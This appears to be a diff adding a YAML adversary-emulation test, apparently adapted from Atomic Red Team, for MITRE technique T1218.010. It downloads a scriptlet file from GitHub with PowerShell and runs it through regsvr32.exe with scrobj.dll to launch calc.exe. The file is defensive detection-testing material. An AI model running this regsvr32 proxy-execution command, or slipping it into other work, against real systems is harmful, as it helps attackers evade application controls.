@@ -1,0 +1,40 @@
+api_version: "2.0"
+name: Regsvr32 local COM scriptlet execution
+description: |
+    Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.
+args:
+    - name: regsvr32name
+      type: string
+      default: regsvr32.exe
+    - name: filename
+      type: path
+      default: PathToAtomicsFolder\T1218.010\src\RegSvr32.sct
+    - name: regsvr32path
+      type: path
+      default: C:\Windows\system32
+uuid: 449aa403-6aba-47ce-8a37-247d21ef0306
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.010: Regsvr32'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Regsvr32.sct must exist on disk at specified location (#{filename})
+      inline: |
+        if (Test-Path "#{filename}") {exit 0} else {{New-Item -Type Directory (split-path "#{filename}") -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
+        }}
+      executor: powershell
+    - name: regsvr32-local-com-scriptlet-execution
+      inline: |
+        {{.Args.regsvr32path}}\{{.Args.regsvr32name}} /s /u /i:"{{.Args.filename}}" scrobj.dll
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
